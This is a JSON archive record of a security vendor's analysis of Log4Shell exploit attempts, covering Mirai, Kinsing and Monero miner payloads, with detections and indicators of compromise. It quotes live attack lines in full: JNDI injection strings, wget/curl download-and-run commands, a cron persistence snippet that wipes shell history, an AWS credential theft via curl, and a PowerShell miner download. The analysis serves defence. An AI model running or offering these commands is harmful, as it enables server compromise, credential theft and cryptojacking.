@@ -1,0 +1,93 @@
+{
+    "id": "331bc752-906a-4fc5-beda-0c82b139dd42",
+    "created_at": "2023-01-12T14:59:51.723981Z",
+    "updated_at": "2025-03-27T02:17:01.042421Z",
+    "deleted_at": null,
+    "sha1_hash": "c454fb9e24c5aa2326978caac665cf7d8385cf88",
+    "title": "2021-12-15 - ThreatLabz analysis - Log4Shell CVE-2021-44228 Exploit Attempts",
+    "authors": "",
+    "file_creation_date": "2022-05-27T21:07:16Z",
+    "file_modification_date": "2022-05-27T21:07:16Z",
+    "file_size": 1053965,
+    "plain_text": "# ThreatLabz analysis - Log4Shell CVE-2021-44228 Exploit Attempts\n\n**[zscaler.com/blogs/security-research/threatlabz-analysis-log4shell-cve-2021-44228-exploit-attempts](https://www.zscaler.com/blogs/security-research/threatlabz-analysis-log4shell-cve-2021-44228-exploit-attempts)**\n\nThe Zscaler ThreatLabz team has been actively monitoring exploit attempts related to the Apache Log4j 0-day Remote\nCode Execution Vulnerability (CVE-2021-44228), also known as “Log4Shell.”\n\nIn this blog we will share our analysis of the exploit payloads being delivered using this vulnerability. We will continue to\nupdate this blog and share more details as we uncover them during our analysis.\n\n[Threatlabz has also published a security advisory related to this vulnerability.](https://www.zscaler.com/blogs/security-research/security-advisory-log4j-0-day-remote-code-execution-vulnerability-cve-2021)\n\n## What is causing this vulnerability?\n\n\n-----\n\nThere is a flaw in the Log4j logging library (version 2.0 to 2.15) where an attacker can control log message parameters to\nexecute arbitrary code loaded from various JNDI endpoints such as HTTP, LDAP, LDAPS, RMI, DNS, IIOP, etc.\n\nA majority of the exploit payloads seen early on after the patch was released by Apache used HTTP and LDAP protocols\nto fetch malicious payloads from attacker server. However, we have now started seeing the use of additional protocols\nincluding RMI, DNS, and IIOP to download malicious payloads onto vulnerable servers.\n\n## Log4j Exploit chain: how it works\n\nThe attacker sends maliciously crafted HTTP requests to a web application server running the vulnerable Log4j utility.\nOnce the request is received, Log4j tries to load the JNDI resource from an attacker-controlled server and—depending\nupon the type of protocol used—loads additional components. These components can include a shell script or a java\nclass that can write a file to disk or memory and executes the final payload.\n\nWe have observed multiple botnets including Mirai and Kinsing (cryptomining) leveraging this Log4j exploit to target\nvulnerable servers on the Internet. In addition to the Mirai and Kinsing families, we have also seen reports of CobaltStrike\nand ransomware-related activity from these exploits.\n\n## Exploit Commands Observed\n\n${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7...\n\n - wget http://62.210.130[.]250/lh.sh;chmod +x lh.sh;./lh.sh\n\n${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCAtcSAtTy0gaHR0cDovLzYyLjIxMC4xMzAuMj...\n\n - wget -q -O- http://62.210.130[.]250/lh.sh|bash\n\n${jndi:ldap://92.242.40.21:5557/Basic/Command/Base64/KGN1cmwgLXMgOTIuMjQyLjQwLjIxL2xoLnNofHx3...\n\n - (curl -s 92.242.40[.]21/lh.sh||wget -q -O- 92.242.40[.]21/lh.sh)\n\nThreat actors also appear to be leveraging network fingerprinting techniques before serving stage 2 payloads.\n\n\n-----\n\nThe injected command will include the victim server IP/Port information that will be checked before serving malicious\npayloads as seen below.\n\n${jndi:ldap://45.155.205.233:12344/Basic/Command/Base64/KGN1cmwgLXMgNDUuMTU1Lj…\n\n - (curl -s 45.155.205[.]233:5874/<VICTIME-IP:PORT>||wget -q -O- 45.155.205[.]233:5874/<VICTIME-IP:PORT>)|bash\n\n**Payload analysis**\n\n**#1 Mirai Botnet**\n\nShell Script lh.sh (MD5: cf2ce888781958e929be430de173a0f8) is downloaded from 62.210.130[.]250 (attacker server).\nThis bash script when executed will further download multiple linux binary payloads on the victim machine. The script also\nsets execute permissions for the downloaded payloads and runs them.\n\nwget http://62.210.130[.]250/web/admin/x86;chmod +x x86;./x86 x86;\n\nwget http://62.210.130[.]250/web/admin/x86_g;chmod +x x86_g;./x86_g x86_g;\n\nwget http://62.210.130[.]250/web/admin/x86_64;chmod +x x86_64;./x86_g x86_64;\n\n[All of these binaries belong to the Mirai botnet family and share the same code structure. They are compiled for different](https://github.com/jgamblin/Mirai-Source-Code/tree/6a5941be681b839eeff8ece1de8b245bcd5ffb02/mirai)\narchitectures - x86 32-bit, 64-bit. There is no code to check the architecture; instead the attacker intends to run all binaries\nhoping one of them will be successful.\n\nThese Mirai binaries were configured to communicate with C2 domain nazi[.]uy on port 25565 and are capable of\nsupporting following commands from the Attacker:\n\nUDP flood\nSYN flood\nACK flood\nTCP stomp flood\nGRE IP flood\nConnect flood\n\n**#2 Kinsing Malware**\n\nShell Script lh2.sh (MD5: 0579a8907f34236b754b07331685d79e) is downloaded from 92.242.40[.]21/lh2.sh it belongs to\nthe Kinsing malware family which essentially is a coinminer with rootkit capabilities.\n\nThe stage 1 bash script (lh2.sh) will stop and disable multiple security processes on the victim server before downloading\nthe Kinsing binary. This is to ensure that the malicious payload is not detected and blocked from execution.\n\n\n-----\n\nKinsing is a Golang-based coin miner as shown below:\n\n92.242.40.21_kinsing: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go\nBuildID=DhskS7dCbYzdqxBh_mSk/76qVIoHRKN1NNcfL8ADh/W157t201-UbEisb9Xatk/hOMqvN1a69kKMwHq_e_v,\nstripped\n\nThe bash script will also establish persistence by adding a cronjob that will periodically download and execute updated\nversions of the bash script from a remote location.\n\n**Persistence**\n\n**if [ $? -eq 0 ]; then**\n\necho \"cron good\"\n\n**else**\n\n(\n\ncrontab -l 2>/dev/null\n\necho \"* * * * * $LDR http://185.191.32[.]198/lh.sh | sh > /dev/null 2>&1\"\n\n) | crontab \nfi\n\nhistory -c\n\nrm -rf ~/.bash_history\n\nhistory -c\n\n\n-----\n\nHere, $LDR value is derived from the victim environment and can either be \"wget -q -O -\" or “curl”\n185.191.32[.]198/lh.sh downloads and executes the latest Kinsing binary but from 80.71.158[.]12/kinsing\n\n**#3 Credential Stealing**\n\nWe also observed a few instances where AWS credentials are being stolen and sent to attacker controlled domain\n\n${jndi:ldap://176.32.33.14/Basic/Command/Base64/Y3VybCAtZCAiJChjYXQgfi8uYXdzL2NyZWRlbnRpYWxzKSIga…\n\n - curl -d \"$(cat ~/.aws/credentials)\" https://c6td5me2vtc0000aq690gdpg14eyyyyyb[.]interactsh[.]com\n\n**#4 Monero Miner**\n\nWe noticed that the exploitation is not just impacting Linux servers but also targeting Windows servers running vulnerable\nversions.\n\nWindows batch file mine.bat (MD5: 3814f201a07cf1a2d5c837c8caeb912f) is downloaded from lurchmath[.]org/wordpresstemp/wp-content/plugins/mine.bat via Powershell. The download file belongs to Monero Miner and uses wallet address\n_42JKzDhbU76Wbf7JSDhomw6utwLr3N8tjZXLzLwvTcPuP5ZGZiJAHwnD7dNf2ZSAh52i9cUefq2nmLK3azKBffkBMX5b1LY_\n\n${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::p}://142.44.203[.]85:1389/Basic/Command/Base64/cG93ZXJzaGVsbCAtQ29t...\n\n - powershell -Command \"$wc = New-Object System.Net.WebClient; $tempfile =\n\n[System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('http://lurchmath[.]org/\nwordpress-temp/wp-content/plugins/mine.bat', $tempfile); & $tempfile\n42JKzDhbU76Wbf7JSDhomw6utwLr3N8tjZXLzLwvTcPuP5ZGZiJAHwnD7dNf2ZSAh52i9cUefq2nmLK3azKBffkBMX5b1LY;\nRemove-Item -Force $tempfile\"\n\nIn comparison, mine.bat is similar to what is found on\nhxxps://github.com/MoneroOcean/xmrig_setup/blob/master/setup_moneroocean_miner.bat\n\n\n-----\n\nMore updates to follow.\n\n## Zscaler Detections\n\n**ThreatName** **DetectionID** **Type Of Detection**\n\n[Apache.Exploit.CVE-2021-44228](https://threatlibrary.zscaler.com/threats/8519393b-db32-428b-844d-50cfb5e9dbf8) 47673 IPS Web - User-Agent\n\n[Apache.Exploit.CVE-2021-44228](https://threatlibrary.zscaler.com/threats/8519393b-db32-428b-844d-50cfb5e9dbf8) 47674 IPS Web - User-Agent\n\n[Apache.Exploit.CVE-2021-44228](https://threatlibrary.zscaler.com/threats/8519393b-db32-428b-844d-50cfb5e9dbf8) 47675 IPS Web - User-Agent\n\n[Apache.Exploit.CVE-2021-44228](https://threatlibrary.zscaler.com/threats/8519393b-db32-428b-844d-50cfb5e9dbf8) 47676 IPS Web - User-Agent\n\n[Apache.Exploit.CVE-2021-44228](https://threatlibrary.zscaler.com/threats/8519393b-db32-428b-844d-50cfb5e9dbf8) 47677 IPS Web - User-Agent\n\n[Apache.Exploit.CVE-2021-44228](https://threatlibrary.zscaler.com/threats/8519393b-db32-428b-844d-50cfb5e9dbf8) 47707 IPS Web - URL\n\n[Apache.Exploit.CVE-2021-44228](https://threatlibrary.zscaler.com/threats/8519393b-db32-428b-844d-50cfb5e9dbf8) 47708 IPS Web - User-Agent\n\n[Apache.Exploit.CVE-2021-44228](https://threatlibrary.zscaler.com/threats/8519393b-db32-428b-844d-50cfb5e9dbf8) 47711 IPS Web - User-Agent\n\n[Apache.Exploit.CVE-2021-44228](https://threatlibrary.zscaler.com/threats/8519393b-db32-428b-844d-50cfb5e9dbf8) 47801 IPS Web - User-Agent\n\n[Apache.Exploit.CVE-2021-44228](https://threatlibrary.zscaler.com/threats/bda3169b-37dc-48da-ab98-dc95f06c8689) 124803 File-Content (Yara)\n\n[Apache.Exploit.CVE-2021-44228](https://threatlibrary.zscaler.com/threats/67f239eb-7c66-4bd0-a9b8-9cdf5013c500) - FIle Reputation\n\n[Linux.Trojan.Mirai](https://threatlibrary.zscaler.com/threats/8241642e-1e11-41ed-8cac-a93f08f76aac) - File Reputation\n\n[Linux.Trojan.Mirai.LZ](https://threatlibrary.zscaler.com/?threatname=linux.trojan.mirai.lz) - URL Reputation\n\n[Linux.Rootkit.Kinsing](https://threatlibrary.zscaler.com/threats/87768cc1-768e-4ca4-9ea5-d9b3b0e10cd4) - File Reputation\n\n[Linux.Rootkit.Kinsing.LZ](https://threatlibrary.zscaler.com/threats/6e56bdbf-fbbe-47ca-be26-b8a0bfa1ff69) - URL Reputation\n\n## Indicators Of Compromise\n\n**Mirai Samples**\n\n40e3b969906c1a3315e821a8461216bb\n\n6d275af23910c5a31b2d9684bbb9c6f3\n\n1348a00488a5b3097681b6463321d84c\n\n**Mirai C2**\n\nnazi[.]uy\n\n\n-----\n\n**Mirai Download URLs**\n62.210.130[.]250/web/admin/x86\n62.210.130[.]250/web/admin/x86_g\n62.210.130[.]250/web/admin/x86_64\n\n**Kinsing Samples**\n648effa354b3cbaad87b45f48d59c616\n\n**Kinsing Shell Scripts**\n92.242.40[.]21/lh2.sh\n80.71.158[.]12/lh.sh\n\n**Kinsing Download URLs**\n92.242.40[.]21/kinsing\n80.71.158[.]12/kinsing\n\n**Persistence**\n185.191.32[.]198/lh.sh\n\n**Top Exploit Server IPs/Domains**\n18.185.60[.]131:1389\n37.233.99[.]127:1389\n45.137.21[.]9:1389\n45.155.205[.]233:12344\n45.155.205[.]233:5874\n78.31.71[.]248:1389\n92.242.40[.]21:5557\n176.32.33[.]14\n178.62.74[.]211:8888\n198.152.7[.]67:54737\n205.185.115[.]217:47324\nqloi8d.dnslog[.]cn\nu7911j.dnslog[.]cn\n90d744e.probe001[.]log4j[.]leakix[.]net:1266\n372d7648[.]probe001[.]log4j[.]leakix[.]net:9200\n4a3b19ce6368.bingsearchlib[.]com:39356\n\n**Monero Miner**\nlurchmath[.]org/wordpress-temp/wp-content/plugins/\nWallet:\n_42JKzDhbU76Wbf7JSDhomw6utwLr3N8tjZXLzLwvTcPuP5ZGZiJAHwnD7dNf2ZSAh52i9cUefq2nmLK3azKBffkBMX5b1LY_\n\n**References**\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-15 - ThreatLabz analysis - Log4Shell CVE-2021-44228 Exploit Attempts.pdf"
+    ],
+    "report_names": [
+        "2021-12-15 - ThreatLabz analysis - Log4Shell CVE-2021-44228 Exploit Attempts.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "eb3f4e4d-2573-494d-9739-1be5141cf7b2",
+            "created_at": "2022-10-25T16:07:24.471018Z",
+            "updated_at": "2025-03-27T02:02:10.24394Z",
+            "deleted_at": null,
+            "main_name": "Cron",
+            "aliases": [],
+            "source_name": "ETDA:Cron",
+            "tools": [
+                "Catelites",
+                "Catelites Bot",
+                "CronBot",
+                "TinyZBot"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        },
+        {
+            "id": "610a7295-3139-4f34-8cec-b3da40add480",
+            "created_at": "2023-01-06T13:46:38.608142Z",
+            "updated_at": "2025-03-27T02:00:02.87217Z",
+            "deleted_at": null,
+            "main_name": "Cobalt",
+            "aliases": [
+                "Cobalt Gang",
+                "GOLD KINGSWOOD",
+                "COBALT SPIDER",
+                "G0080",
+                "Mule Libra",
+                "Cobalt Group"
+            ],
+            "source_name": "MISPGALAXY:Cobalt",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        },
+        {
+            "id": "a6c351ea-01f1-4c9b-af75-cfbb3b269ed3",
+            "created_at": "2023-01-06T13:46:39.390649Z",
+            "updated_at": "2025-03-27T02:00:03.072899Z",
+            "deleted_at": null,
+            "main_name": "Kinsing",
+            "aliases": [
+                "Money Libra"
+            ],
+            "source_name": "MISPGALAXY:Kinsing",
+            "tools": [],
+            "source_id": "MISPGALAXY",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535591,
+    "ts_updated_at": 1743041821,
+    "ts_creation_date": 1653685636,
+    "ts_modification_date": 1653685636,
+    "files": {
+        "pdf": "https://archive.orkl.eu/c454fb9e24c5aa2326978caac665cf7d8385cf88.pdf",
+        "text": "https://archive.orkl.eu/c454fb9e24c5aa2326978caac665cf7d8385cf88.txt",
+        "img": "https://archive.orkl.eu/c454fb9e24c5aa2326978caac665cf7d8385cf88.jpg"
+    }
+}
